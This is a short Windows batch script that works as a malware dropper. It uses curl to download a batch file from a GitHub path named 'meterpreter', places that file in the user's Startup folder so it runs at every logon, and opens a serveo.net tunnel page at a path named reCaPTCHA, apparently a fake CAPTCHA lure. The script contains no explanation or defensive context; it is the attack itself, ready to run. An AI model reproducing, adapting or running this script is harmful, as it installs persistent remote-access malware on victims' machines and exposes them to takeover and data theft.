@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
start https://fbed484c6ea22e0467671566e490de70.serveo.net/reCaPTCHA/r.html
